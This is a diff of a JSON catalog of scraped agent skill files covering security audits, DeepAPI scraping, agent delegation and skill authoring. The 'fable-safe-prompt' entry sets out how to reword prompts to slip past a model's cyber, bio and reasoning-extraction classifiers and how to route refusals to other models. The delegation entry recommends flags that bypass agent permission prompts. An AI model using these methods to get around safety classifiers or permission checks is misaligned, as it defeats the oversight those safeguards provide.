verdict is \"Affected\", list the remediation command in **Follow-ups** and stop. The user runs it.\n\n## Reference\n\nTwo existing reports in `~/Documents/security-audits/` show the expected style:\n- `baseline-audit.md` (long-form baseline audit — different format, do not mimic)\n- `YYYY-MM-DD-example-advisory.md` and any newer `YYYY-MM-DD-*.md` files (this is the format to match)\n\n## Limitations\n\n- Adapted from `davidondrej/skills`; verify local paths, tools, credentials, and agent features before acting.\n- For commands, remote access, scheduling, bro",
+      "tags": [
+        "python",
+        "node",
+        "markdown",
+        "claude",
+        "ai",
+        "agent",
+        "automation",
+        "workflow",
+        "template",
+        "document"
+      ],
+      "useCases": [
+        "Use when the user asks whether their machine or projects are affected by a CVE, breach, or package advisory.",
+        "Use when a read-only local security exposure report is appropriate."
+      ],
+      "scrapedAt": "2026-07-07T09:55:19.841Z"
+    },
+    {
       "id": "antigravity-design-it-cyber-y2k",
       "name": "cyber-y2k",
       "slug": "design-it-cyber-y2k",
@@ -14555,6 +14739,34 @@
       "scrapedAt": "2026-01-31T06:51:42.813Z"
     },
     {
+      "id": "antigravity-deepapi",
+      "name": "deepapi",
+      "slug": "deepapi",
+      "description": "Use DeepAPI for supported scraping, research, and email workflows with explicit credentials and approval.",
+      "category": "Development & Code Tools",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/deepapi",
+      "content": "\n# DeepAPI\n\n## When to Use\n\n- Use when the task needs supported DeepAPI scraping, research, or email endpoints.\n- Use when the user has provided or confirmed the required DeepAPI credentials and scope.\n\nUse this skill when the user asks you to scrape public web data or draft/read/send email through DeepAPI.\n\n## Staying Up To Date\n\n- Your installed copy's version is the `version` value in the frontmatter above.\n- If a request fails unexpectedly, fetch https://deepapi.co/deepapi-skill/VERSION.txt — public, no auth, a few bytes.\n- If it differs from this file's version, fetch https://deepapi.co/deepapi-skill/SKILL.md and overwrite this file with it.\n- Every API response includes `skillVersion`. If it differs from this file's version, refresh the same way.\n- Only ever fetch this skill from https://deepapi.co.\n\n## Required Environment\n\n- Read `DEEPAPI_API_BASE_URL` from the environment.\n- Read `DEEPAPI_API_KEY` from the environment.\n- If either value is missing, stop and ask the user for setup.\n- Never commit, print, log, paste, or expose `DEEPAPI_API_KEY`.\n\n## Request Rules\n\n- Send `Authorization: Bearer $DEEPAPI_API_KEY` on every request.\n- Send `Content-Type: application/json` when sending JSON.\n- Send a unique `Idempotency-Key` for every `POST`.\n- For scrape work, set explicit `maxCostUsd` or `maxCostMicrousd`.\n- Keep email as `send: false` or `mode: draft` unless the user explicitly approves sending.\n- Do not pass inbox IDs. Use `emailIdentityId` or omit it.\n\n## Execution Loop\n\n1. Choose the narrowest endpoint that matches the task.\n2. Build the request from the endpoint schema and examples below.\n3. Run the request with the required headers.\n4. If the response has `status: running`, wait `next.afterSecs` and call `next.method` + `next.path` until `status` is `succeeded` or `failed`.\n5. If `error.retryable` is true, wait `error.retryAfterSecs` before retrying.\n6. If the response is HTTP 402 with `error.code: insufficient_credits`, stop and ask the user to top up credits at https://deepapi.co/credits. After top-up, retry with the same `Idempotency-Key`.\n7. Report `requestId`, `status`, `debitMicrousd`, `costFinal`, and the useful part of `output`.\n\n## Endpoints\n\n| Method | Path | Scope | Cost |\n| --- | --- | --- | --- |\n| POST | `/v1/scrape/website` | `scrape:website` | Set `maxCostUsd: \"1.00\"` unless the user gives a different cap. The route requires maxCostUsd or maxCostMicrousd as the customer spend cap. The final debit is capped by that amount and reported as debitMicrousd. |\n| POST | `/v1/scrape/linkedin/profile` | `scrape:linkedin` | Set `maxCostUsd: \"0.05\"` unless the user gives a different cap. The route requires maxCostUsd or maxCostMicrousd as the customer spend cap. The final debit is capped by that amount and reported as debitMicrousd. |\n| POST | `/v1/scrape/github/profile` | `scrape:github` | Set `maxCostUsd: \"0.03\"` unless the user gives a different cap. The route requires maxCostUsd or maxCostMicrousd as the customer spend cap. The final debit is capped by that amount and reported as debitMicrousd. |\n| POST | `/v1/scrape/twitter/search` | `scrape:twitter` | Set `maxCostUsd: \"0.03\"` unless the user gives a different cap. The route requires maxCostUsd or maxCostMicrousd as the customer spend cap. The final debit is capped by that amount and reported as debitMicrousd. |\n| POST | `/v1/scrape/linkedin/jobs` | `scrape:linkedin` | Set `maxCostUsd: \"0.05\"` unless the user gives a different cap. The route requires maxCostUsd or maxCostMicrousd as the customer spend cap. The final debit is capped by that amount and reported as debitMicrousd. |\n| POST | `/v1/scrape/linkedin/company` | `scrape:linkedin` | Set `maxCostUsd: \"0.05\"` unless the user gives a different cap. The route requires maxCostUsd or maxCostMicrousd as the customer spend cap. The final debit is capped by that amount and reported as debitMicrousd. |\n| POST | `/v1/scrape/linkedin/people` | `scrape:linkedin` | Set `maxCostUsd: \"0.50\"` unless the user gives a different cap. The route requires maxCostUsd or maxCostMicrousd as the customer spend cap. The final debit is capped by that amount and reported as debitMicrousd. |\n| POST | `/v1/scrape/linkedin/posts` | `scrape:linkedin` | Set `maxCostUsd: \"0.05\"` unless the user gives a different cap. The route requires maxCostUsd or maxCostMicrousd as the customer spend cap. The final debit is capped by that amount and reported as debitMicrousd. |\n| POST | `/v1/scrape/twitter/user` | `scrape:twitter` | Set `maxCostUsd: \"0.05\"` unless the user gives a different cap. The route requires maxCostUsd or maxCostMicrousd as the customer spend cap. The final debit is capped by that amount and reported as debitMicrousd. |\n| POST | `/v1/scrape/twitter/replies` | `scrape:twitter` | Set `maxCostUsd: \"0.20\"` unless the user gives a different cap. The route requires maxCostUsd or maxCostMicrousd as the customer spend cap. The final debit is capped by that amount and reported as debitMicrousd. |\n| POST | `/v1/scrape/",
+      "tags": [
+        "node",
+        "markdown",
+        "api",
+        "claude",
+        "ai",
+        "agent",
+        "automation",
+        "workflow",
+        "image",
+        "cro"
+      ],
+      "useCases": [
+        "Use when the task needs supported DeepAPI scraping, research, or email endpoints.",
+        "Use when the user has provided or confirmed the required DeepAPI credentials and scope."
+      ],
+      "scrapedAt": "2026-07-07T09:55:34.598Z"
+    },
+    {
       "id": "openhands-default-tools",
       "name": "default-tools",
       "slug": "default-tools",
@@ -14612,6 +14824,34 @@
         "Use for docs, articles, blog posts, and similar public web content."
       ],
       "scrapedAt": "2026-03-22T07:03:11.511Z"
+    },
+    {
+      "id": "antigravity-delegating-to-agents",
+      "name": "delegating-to-agents",
+      "slug": "delegating-to-agents",
+      "description": "Delegate bounded work to other AI agents while preserving context, ownership, and progress checks.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/delegating-to-agents",
+      "content": "\n# Delegating to Agents\n\n## When to Use\n\n- Use when work should be handed to another AI agent with a complete prompt and progress checks.\n- Use when you need to relay instructions to terminal or TUI agents without losing context.\n\n## Which agent to pick\n\n- **Coding (default) → Codex CLI.** Strongest coding agent, especially for complex, long-running SWE tasks. It's on an unlimited-usage plan — effectively unlimited, don't ration it.\n- **Most other tasks → Pi Agent** (`pi` in a cmux terminal). All Pi agents run opus-4.8-fast via OpenRouter at xhigh reasoning effort.\n- **Frontend / design → Pi.** Opus 4.8 Fast beats Codex on UI, styling, design.\n- **Heavy multi-step work:** you as orchestrator + Codex CLI executing in a right-hand cmux pane is a solid default setup.\n\n## Sending prompts to a TUI agent\n\n1. **ONE single line — never newlines in the message body.** In a TUI, newline = Enter: a multi-line prompt submits at the first line and the rest arrives as fragmented mid-turn steering messages. Use \". \" or \"; \" instead of line breaks, then one explicit enter. For long instructions, write them to a file and send: `read /tmp/task.md and follow it`.\n2. **Wrap the prompt in plain double quotes — NEVER escaped.** `cmux send --surface surface:N \"your prompt\"`. The recurring bug is emitting `\\\"` — in bash that's literal-broken and dies with `unexpected EOF`. Inside the prompt, avoid apostrophes and literal double quotes (write \"dont\", \"wont\", \"lets\"); rephrase instead of escaping. If a send failed, the cause was the escaped `\\\"`, not the quote type.\n3. **Exact command names:** `cmux send --surface surface:N` then `cmux send-key --surface surface:N enter`. There is NO `send-surface` or `send-key-surface`.\n\n## Polling\n\nKeep sleeps SHORT: start at 3-5s, re-check, repeat. Don't `sleep 30`. Pi and Hermes (opus-4.8-fast) launch and respond within seconds; scale up only for genuinely heavy tasks. After every check, send the user a one-line status: what the agent is doing and whether it's on track.\n\nClaude Code note: after it finishes, it may prefill a predicted next user message — that draft is Claude, not the user.\n\n## Remote VPS\n\nSSH in first and launch the agent ON the VPS (e.g. `codex --yolo`), then drive that on-box agent. Don't run an agent locally and have it SSH for every step.\n\n## The 4 agents (background reference)\n\nAll four use the portable SKILL.md standard; project skills win over global.\n\n- **Pi** (pi.dev, open-source TS): minimal read/write/edit/bash core, self-extends via TS extensions; true BYOK; best-in-class session branch/fork/resume. Skills: `~/.pi/agent/skills/`.\n- **Codex CLI** (OpenAI, Rust): fastest startup; kernel-level sandboxing; `codex exec` for CI; reads AGENTS.md. Skills: `~/.codex/skills/`.\n- **Claude Code** (Anthropic, TS): deepest Claude integration, `.claude/` conventions, live skill hot-reload. Skills: `~/.claude/skills/`.\n- **Hermes** (Nous Research, Python): persistent autonomous agent — cross-session memory, built-in scheduler, 40+ tools; can orchestrate the other CLIs as workers. Skills: `~/.hermes/skills/`.\n\n## Driving interactive CLIs\n\n- Codex, Pi, OpenCode: need `pty=true`.\n- Claude Code: prefer `claude --print --permission-mode bypassPermissions` (no PTY).\n\n## Limitations\n\n- Adapted from `davidondrej/skills`; verify local paths, tools, credentials, and agent features before acting.\n- For commands, remote access, scheduling, browser automation, or file-changing workflows, get explicit user approval and confirm the target environment first.\n",
+      "tags": [
+        "python",
+        "api",
+        "claude",
+        "ai",
+        "agent",
+        "automation",
+        "workflow",
+        "design",
+        "rag",
+        "cro"
+      ],
+      "useCases": [
+        "Use when work should be handed to another AI agent with a complete prompt and progress checks.",
+        "Use when you need to relay instructions to terminal or TUI agents without losing context."
+      ],
+      "scrapedAt": "2026-07-07T09:55:35.486Z"
     },
     {
       "id": "antigravity-agent-squad-dep",
@@ -15713,6 +15953,30 @@
       "scrapedAt": "2026-01-26T13:18:04.995Z"
     },
     {
+      "id": "antigravity-distribute-skill-to-all-agents",
+      "name": "distribute-skill-to-all-agents",
+      "slug": "distribute-skill-to-all-agents",
+      "description": "Distribute a skill across configured agent skill folders while respecting local symlink layouts.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/distribute-skill-to-all-agents",
+      "content": "\n# Distribute a Skill Across All Agents\n\n## When to Use\n\n- Use when a skill should be made available across multiple local agent skill folders.\n- Use when the user asks to sync or distribute skill updates to other agents.\n\nThe user has 4 agent skill locations on his MacBook. A skill must exist in each (or via symlink) to be discoverable by every agent.\n\n## The 4 Canonical Locations\n\n| Agent | Skills Folder | Notes |\n|---|---|---|\n| Codex / OpenAI Agents | `~/.agents/skills/` | **Canonical** — author skills here first |\n| Claude Code | `~/.claude/skills/` | **Symlink → `~/.agents/skills/`** — writing to `.agents/skills` automatically covers Claude |\n| Pi Agent | `~/.pi/agent/skills/` | **Symlink → `~/.agents/skills/`** — auto-covered. (Path is `/agent/` nested — NOT `~/.pi/skills/`) |\n| Hermes Agent | `~/.hermes/skills/` | Independent copy — the only one needing a manual copy |\n\n## Workflow\n\n1. **Author the skill in `~/.agents/skills/<skill-name>/SKILL.md`** (canonical). Follow `effective-agent-skills` SKILL.md guidance.\n2. **Verify the `.claude` symlink is intact** (one-time check):\n   ```bash\n   ls -la ~/.claude/skills\n   # Expect: ~/.claude/skills -> ~/.agents/skills\n   ```\n   If it's a real directory instead of a symlink, the user has diverged copies — ask before touching.\n3. **Copy to `.hermes` only** (`.claude` and `.pi` are symlinks — already covered):\n   ```bash\n   SKILL=<skill-name>\n   cp -r ~/.agents/skills/$SKILL ~/.hermes/skills/\n   ```\n4. **Verify all 4 locations** show identical byte counts:\n   ```bash\n   for p in ~/.agents/skills/$SKILL ~/.claude/skills/$SKILL ~/.pi/agent/skills/$SKILL ~/.hermes/skills/$SKILL; do\n     echo \"$p: $(wc -c < $p/SKILL.md) bytes\"\n   done\n   ```\n   All four numbers must match. If `.claude` or `.pi` shows a different byte count, that symlink is broken — investigate before proceeding.\n\n## Updating an Existing Distributed Skill\n\nSame flow — re-copy from `~/.agents/skills/` to `.hermes/skills/`. The `.claude` and `.pi` symlinks update automatically. `cp -r` overwrites by default; use `rsync -a --delete` if the skill folder has nested files that may have been removed:\n\n```bash\nrsync -a --delete ~/.agents/skills/$SKILL/ ~/.hermes/skills/$SKILL/\n```\n\n## Pitfalls\n\n- **`~/.pi/skills/` is the wrong location.** Pi Agent loads from `~/.pi/agent/skills/` only. A skill placed in `~/.pi/skills/` is invisible. If you find skills already there, they're orphans — confirm with the user before deleting.\n- **`~/.claude/skills` is a symlink, not a folder.** `cp -r ~/.agents/skills/foo ~/.claude/skills/` will error with \"are identical\". Skip the explicit Claude copy.\n- **Project-local skills exist too** — `./.pi/agent/skills/` (or `.pi/skills/`) inside a repo overrides the global one on collision (later-discovered wins). This skill only handles GLOBAL distribution.\n- **`.pi/agent/skills` is a symlink → `.agents/skills`.** Don't `cp` into it (errors \"are identical\"); it auto-syncs. Only `.hermes/skills` is an independent copy — don't unilaterally consolidate Hermes into a symlink unless the user asks.\n- **Hermes snapshots skills at session start.** A newly-distributed skill won't appear inside a running Hermes session until restart (it works fine for future sessions and for the other 3 agents immediately).\n- **Filename casing matters on case-sensitive volumes.** `SKILL.md` must be uppercase.\n\n## When NOT to Use This Skill\n\n- Skill is project-specific → put it in `./.claude/skills/`, `./.pi/agent/skills/`, etc. inside the repo, not globally.\n- Editing one agent's skill only (e.g. a Hermes-only workflow) → patch that file directly, don't propagate.\n- Removing a skill globally is destructive. First show the exact skill directories\n  that would be removed, confirm with the user, then use the user's preferred\n  safe deletion method for `~/.agents/skills/` and `~/.hermes/skills/`.\n\n## Limitations\n\n- Adapted from `davidondrej/skills`; verify local paths, tools, credentials, and agent features before acting.\n- For commands, remote access, scheduling, browser automation, or file-changing workflows, get explicit user approval and confirm the target environment first.\n",
+      "tags": [
+        "claude",
+        "ai",
+        "agent",
+        "automation",
+        "workflow",
+        "cro"
+      ],
+      "useCases": [
+        "Use when a skill should be made available across multiple local agent skill folders.",
+        "Use when the user asks to sync or distribute skill updates to other agents."
+      ],
+      "scrapedAt": "2026-07-07T09:56:04.523Z"
+    },
+    {
       "id": "antigravity-distributed-debugging-debug-trace",
       "name": "distributed-debugging-debug-trace",
       "slug": "distributed-debugging-debug-trace",
@@ -16716,6 +16980,34 @@
       ],
       "useCases": [],
       "scrapedAt": "2026-06-19T10:49:45.547Z"
+    },
+    {
+      "id": "antigravity-effective-agent-skills",
+      "name": "effective-agent-skills",
+      "slug": "effective-agent-skills",
+      "description": "Author and review high-quality agent skills with triggers, progressive disclosure, and safety notes.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/effective-agent-skills",
+      "content": "\n# Agent Skills: A Complete Guide\n\n## When to Use\n\n- Use when creating, editing, reviewing, or debugging an agent SKILL.md file.\n- Use when you need quality guidance for triggers, examples, limitations, and safety notes.\n\nA consolidated reference on what agent skills are, why they exist, how they work, and how to write effective ones.\n\n---\n\n## 1. What agent skills are\n\nAn Agent Skill is a folder containing a `SKILL.md` file (YAML frontmatter + markdown instructions), plus optional subfolders for scripts, references, and assets that the agent loads on demand.\n\n```\nmy-skill/\n├── SKILL.md          # Required: metadata + instructions\n├── scripts/          # Optional: executable code (CLIs, validators, helpers)\n├── references/       # Optional: detailed docs loaded only when needed\n└── assets/           # Optional: templates, fonts, static files\n```\n\nSkills are an open standard (agentskills.io), originally created by Anthropic and adopted by OpenAI Codex, Cursor, Gemini CLI, Microsoft Agent Framework, Google ADK, and 40+ other agent products. A skill written once works across all compatible agents.\n\n---\n\n## 2. Why this abstraction exists\n\nBase LLMs are generalists. Real work requires procedural knowledge, organizational context, and repeatable workflows. Every prior alternative had a failure mode:\n\n| Approach | Problem |\n|---|---|\n| Stuff it into the system prompt | Always loaded → context bloat at scale |\n| Re-paste instructions each session | No version control, no consistency |\n| Fine-tuning | Slow, expensive, opaque, vendor-locked |\n| MCP servers alone | Give the agent tools but no workflows for using them |\n\nSkills solve four problems at once:\n\n- **Context efficiency** — instructions load only when relevant\n- **Repeatability** — multi-step procedures become auditable workflows\n- **Composability** — multiple skills combine at runtime per task\n- **Portability** — same files work across vendors and surfaces\n\nMental model: skills are to LLMs what man pages, runbooks, and team handbooks are to engineers — reference material loaded into working memory only when the task demands it.\n\n---\n\n## 3. How they work — progressive disclosure\n\nThe architectural core. Three-stage loading:\n\n**Level 1 — Discovery (~100 tokens per skill, always in context):**\nOnly `name` + `description` from frontmatter are injected into the system prompt at startup. Agent knows the skill exists and when it applies. You can install dozens of skills with negligible overhead.\n\n**Level 2 — Activation (<5,000 tokens, loaded on match):**\nWhen the user's request matches a skill's description, the agent reads the full `SKILL.md` body into context.\n\n**Level 3 — Execution (unbounded, on demand):**\nThe agent reads referenced files (`references/foo.md`) or runs scripts (`scripts/validate.py`) only as needed. Scripts can execute without their source being loaded into context at all.\n\nThis is why bundled content has no practical limit. Files don't consume tokens until accessed.\n\n---\n\n## 4. SKILL.md anatomy\n\n```markdown\n---\nname: skill-name\ndescription: What this skill does AND when to use it. Include trigger phrases the user will say.\n---\n\n# Skill Name\n\n## Quick start\n[Minimal working example]\n\n## Workflow\n[Step-by-step procedure with checklists]\n\n## Output format\n[What the user/agent should expect back]\n\n## Advanced\n[Link to references/ for rarely-needed detail]\n```\n\nFrontmatter constraints:\n- `name` is lowercase, hyphens only, 1–64 chars, **exactly matches the parent folder name**\n- Avoid `<` and `>` in frontmatter (they can inject into the system prompt)\n- Invalid YAML silently prevents loading\n\nOptional standard fields:\n- `disable-model-invocation: true` — stops the agent from auto-loading the skill based on the conversation; it can only be triggered manually (e.g. `/skill-name`). Now a standard Agent Skills spec field, so it works across spec-compliant clients (Claude Code, Copilot, etc.), not just Claude. Caveat: it prevents auto-invocation, but some clients (Claude Code, open bug) still inject the `description` into context, so it doesn't always save the discovery-level tokens. Use for manual-only utilities you don't want firing automatically.\n\n---\n\n## 5. Two design philosophies\n\nSkills tend to fall into one of two patterns. Both are valid; they solve different problems.\n\n### Pattern A — Capability primitives (tool wrappers)\nThe skill is a thin wrapper over a deterministic CLI or script. Logic lives in code. SKILL.md teaches the agent how to invoke it.\n\n- **Adds**: new capabilities (search, email, browser, API access)\n- **Reliability via**: shell tools, not prompts\n- **Typical length**: 30–80 lines, mostly command examples\n- **Use when**: the bottleneck is \"the agent can't do X\"\n\n### Pattern B — Process primitives (cognitive disciplines)\nThe skill encodes a methodology the agent should follow. Pure prompt engineering — no scripts needed.\n\n- **Adds**: structured workflows (TDD, code review, design alignment, debugging loops)\n- **Reliability via**: exp",
+      "tags": [
+        "python",
+        "pdf",
+        "markdown",
+        "api",
+        "mcp",
+        "claude",
+        "ai",
+        "agent",
+        "llm",
+        "automation"
+      ],
+      "useCases": [
+        "Use when creating, editing, reviewing, or debugging an agent SKILL.md file.",
+        "Use when you need quality guidance for triggers, examples, limitations, and safety notes."
+      ],
+      "scrapedAt": "2026-07-07T09:56:17.526Z"
     },
     {
       "id": "antigravity-efficient-web-research",
@@ -17834,6 +18126,33 @@
       "scrapedAt": "2026-03-07T06:54:33.152Z"
     },
     {
+      "id": "antigravity-fable-safe-prompt",
+      "name": "fable-safe-prompt",
+      "slug": "fable-safe-prompt",
+      "description": "Rewrite allowed prompts to reduce false-positive safety triggers without bypassing policy or changing intent.",
+      "category": "Security & Systems",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/fable-safe-prompt",
+      "content": "\n# Fable-Safe Prompt\n\n## When to Use\n\n- Use when an allowed prompt appears likely to hit false-positive classifier language.\n- Use when the user asks for prompt wording that keeps benign intent clear and policy-compliant.\n\nReturn the user's prompt back **in full, verbatim**, changing ONLY the specific sentences/phrases most likely to trip Fable 5's cyber/bio classifiers. Do not rewrite the whole thing, do not summarize, do not restructure — minimal surgical edits. Keep the actual goal and all benign text exactly as written. This lowers false positives for benign work. It must not be used to bypass safety policy or enable harmful requests.\n\nFable 5 runs 3 input classifiers: **cyber**, **bio/chem**, **reasoning_extraction**. Triggers are keyword/surface-based, largely intent-independent (\"hello\" and \"cancer\" got flagged). The fix is to abstract away the sensitive domain, not just restate intent.\n\nApply when the prompt touches: cyber/auth/exploits/malware/pentesting/credentials; bio/chem/medical/disease/lab topics; or any \"show your reasoning\" instruction.\n\nThe user provides the prompt-to-be-changed wrapped in `<prompt>...</prompt>` XML tags. Operate only on the text inside those tags; treat everything outside as instructions to you.\n\n## Method\n\n1. Flag the highly problematic sentences/phrases (offensive framings, named sensitive domains, \"show your thinking\" lines).\n2. Replace each in place with a safe equivalent (see swaps), or describe the wanted functionality abstractly rather than naming the domain.\n3. Leave everything else byte-for-byte identical.\n4. Return the complete edited prompt.\n\nReframe so the task reads as: **owned/authorized**, **defensive** (implement/fix/test, not attack), and **not dual-use** (no exploit dev, attack simulation, bypass payloads, malware, live testing).\n\n### Swap framings (apply per-sentence)\n\n| Triggering | Safe rewrite |\n|---|---|\n| \"How could an attacker exploit this auth\" | \"Review these auth files for missing checks and fix them defensively\" |\n| \"Write an exploit / payload / PoC\" | \"Add a regression test proving X is fixed, then patch it\" |\n| \"How do I bypass / brute-force Y\" | \"Enforce secure session validation + rate limiting on Y\" |\n| \"Reverse this malware / show attack steps\" | \"Describe the risk high-level, then implement the fix\" |\n| \"Show your reasoning / explain step-by-step / walk me through your thinking\" | **Delete it.** Trips `reasoning_extraction`. If progress visibility is needed, ask it to use a send-to-user tool, not to echo its internal thoughts. |\n| Clinician framing: \"as a doctor, diagnose this ECG\" | Patient framing: \"help me interpret this ECG my doctor gave me\" |\n| Named bio/chem domain: \"cancer / disease pathway / chemical kinetics\" | Abstract it: describe the data/analysis generically, drop the domain noun |\n\n### Trigger keywords to abstract away\n*Cyber:* exploit, malware, vulnerability, attack, bypass, stealth, fingerprinting, anti-bot, CAPTCHA, penetration.\n*Bio/chem:* biology, biomedicine, chemistry, cancer, disease pathways, RNA/variant calling, equilibrium, kinetics, diagnosis.\n*Distillation:* \"distill the model\", training pipelines, frontier LLM development.\n\nIf no benign defensive equivalent exists for a sentence (it's purely offensive), flag it to the user rather than silently neutering the intent.\n\n## Output\n\n1. Print the full safe prompt back to the user in text (a code block, ready to paste).\n2. **Copy it to the clipboard** so the user can paste immediately:\n   ```bash\n   pbcopy <<'EOF'\n   <the full safe prompt>\n   EOF\n   ```\n   Confirm in one line that it's on the clipboard.\n3. A short list of exactly which sentences you changed and what they became.\n4. If the task is genuinely offensive (pentest, exploit repro, malware analysis): say plainly no edit makes it Fable-safe — use an Opus 4.8 fallback or vetted Mythos, not Fable 5.\n\n**Hard truth:** you can't reliably stop Fable 5 guardrails. Robust API setups also treat `stop_reason: \"refusal\"` (HTTP 200, `stop_details.category` = `cyber`/`bio`) as a route to an Opus 4.8 fallback — mention only if the user controls the integration.\n\n## Limitations\n\n- Adapted from `davidondrej/skills`; verify local paths, tools, credentials, and agent features before acting.\n- For commands, remote access, scheduling, browser automation, or file-changing workflows, get explicit user approval and confirm the target environment first.\n",
+      "tags": [
+        "api",
+        "claude",
+        "ai",
+        "agent",
+        "llm",
+        "automation",
+        "workflow",
+        "pentest",
+        "vulnerability"
+      ],
+      "useCases": [
+        "Use when an allowed prompt appears likely to hit false-positive classifier language.",
+        "Use when the user asks for prompt wording that keeps benign intent clear and policy-compliant."
+      ],
+      "scrapedAt": "2026-07-07T09:56:36.600Z"
+    },
+    {
       "id": "antigravity-faf-context",
       "name": "faf-context",
       "slug": "faf-context",
@@ -18843,6 +19162,34 @@
         "\"Integrate native iOS/Android features with platform channels\""
       ],
       "scrapedAt": "2026-02-26T07:11:20.625Z"
+    },
+    {
+      "id": "antigravity-folder-specific-claude-and-agents-md",
+      "name": "folder-specific-claude-and-agents-md",
+      "slug": "folder-specific-claude-and-agents-md",
+      "description": "Create folder-scoped CLAUDE.md and AGENTS.md guidance for future agents working in that area.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/folder-specific-claude-and-agents-md",
+      "content": "\n# Folder CLAUDE.md Creation\n\n## When to Use\n\n- Use when the user asks for folder-specific agent instructions or local context files.\n- Use when a subdirectory needs a CLAUDE.md and AGENTS.md handoff for future agents.\n\nGenerate a focused `CLAUDE.md` inside a target folder, plus an `AGENTS.md` symlink pointing at it. The file gives any future agent (Claude Code, Codex, etc.) the folder-specific context the global `CLAUDE.md` doesn't cover.\n\nBackground reference: `library/claude-code/claude-and-agents-md.md`.\n\n## Process\n\n### Step 1: Confirm the target folder + sanity-check it deserves a file\nAsk the user which folder. Use absolute path under `~/Documents/code/workspace/`.\n\n**Only create a file if the folder has context needed across multiple sessions** — active evolving work, specific conventions, ongoing decisions. A folder of static reference files does NOT need one (agents can read on demand). If unsure, ask the user.\n\n### Step 2: Read every file in the folder IN FULL\n- Use `ls -la` first to enumerate files and subfolders.\n- Read every markdown, config, and key source file.\n- For large tldraw/Vite subprojects: read `package.json`, `src/App.tsx`, one representative module file, and the folder's own `module-details.md`-style files.\n- Do NOT skim. Do NOT skip. The user's later edits depend on you having full context.\n\n### Step 3: Draft a bullet list of candidate content\nBefore writing the file, give the user a bullet list grouped by section — let them react first. Candidate sections (skip any that don't apply):\n\n- **Product / Purpose** — what this folder/project is, current state, key metrics\n- **Avatar / Audience** — who it's for (if applicable)\n- **Essential Files** — one-line role for each important file, including cross-folder references (use `@path/file.md` import syntax)\n- **Constraints (MUST NOT)** — explicit hard negatives. Highest-ROI content in the file.\n- **Conventions** — the user's lingo, status emojis (✅ 🟡), naming patterns, \"usually do\" patterns\n- **Locked Decisions** — things agreed + dated, must not re-litigate\n- **Context** — history, authority, credibility that frames the work\n- **How to work with the user** — collaboration style for this specific folder\n- **Marketing Angles / Positioning** — if public-facing\n- **Top Insights** — 3-5 most glaring signals from research (if research exists)\n\n### Step 4: Iterate with the user\n- Keep answers short. The user will edit directly in the IDE.\n- When they edit the file, RE-READ it and flag: contradictions, typos, missing rules, wrong categorization.\n- Do not revert their edits unless asked.\n\n### Step 5: Write the file\n- Path: `<folder>/CLAUDE.md`\n- Start with a one-line header explaining the file's purpose.\n- **Subdir file marker:** if this is a subdirectory file (parent folder already has its own CLAUDE.md), open with `Apply root CLAUDE.md first, then this file.`\n- Use `##` section headers matching the sections the user approved.\n- Bullets over prose. Short bullets.\n- **Cross-folder references:** use `@relative/path/file.md` import syntax, not prose mentions.\n- **Heavy reference docs:** annotate with `**Read when:**` triggers (e.g. \"Read when: writing offer copy\"). Prevents loading every session.\n\n### Step 6: Create the AGENTS.md symlink\n```\ncd <folder> && ln -s CLAUDE.md AGENTS.md\n```\nVerify with `ls -la CLAUDE.md AGENTS.md`.\n\n### Step 7: Commit only when asked\nDo NOT stage or push unless the user says to. When they do: `git add -A`, commit with a `Day N:` style message, push.\n\n## Rules\n\n- **Never invent content.** Every bullet must trace back to something you read in the folder or something the user said. No generic boilerplate.\n- **Brevity wins.** The user edits aggressively to make things shorter. Start tight.\n- **Folder-scoped only.** Don't duplicate the global `CLAUDE.md` (personality, dates, ports, etc.). Only include what's specific to this folder.\n- **No file trees, no directory dumps, no stack details the code already shows.** Anything an agent can derive from `ls` or `grep` rots fast and wastes tokens. Pin decisions, rules, and context — not structure.\n- **Constraints vs Conventions.** Hard \"MUST NOT\" rules go in Constraints (explicit negatives). \"Usually do X\" patterns go in Conventions. Splitting these improves adherence.\n- **No absolute ALWAYS/NEVER without explicit exceptions.** Edge cases make absolute rules get ignored. \"Never commit secrets EXCEPT `.env.example`\" beats \"never commit secrets.\"\n- **Never summarize or auto-shorten the file.** Context collapse degrades it. Grow deliberately, prune manually. If the user asks to trim, do it by hand.\n- **Maintenance loop.** When the user corrects the agent on something this file should have prevented, add the rule to the file immediately. Don't wait.\n- **No emojis unless the user uses them** (status markers ✅ 🟡 are the exception — they're already conventions).\n- **Symlink, not copy.** `AGENTS.md` must be a symlink so edits stay in sync.\n- **Flag gaps honestly.** If the user's edits in",
+      "tags": [
+        "react",
+        "markdown",
+        "claude",
+        "ai",
+        "agent",
+        "automation",
+        "workflow",
+        "document",
+        "cro",
+        "marketing"
+      ],
+      "useCases": [
+        "Use when the user asks for folder-specific agent instructions or local context files.",
+        "Use when a subdirectory needs a CLAUDE.md and AGENTS.md handoff for future agents."
+      ],
+      "scrapedAt": "2026-07-07T09:56:47.967Z"
     },
     {
       "id": "antigravity-food-database-query",
@@ -21034,6 +21381,31 @@
         "你需要面向个人健康管理的目标优化建议、风险提示和阶段性调整方案。"
       ],
       "scrapedAt": "2026-03-07T06:55:04.879Z"
+    },
+    {
+      "id": "antigravity-goal-loop",
+      "name": "goal-loop",
+      "slug": "goal-loop",
+      "description": "Draft and explain persistent goal-loop prompts for long-running agent work with clear stop conditions.",
+      "category": "Document Processing",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/goal-loop",
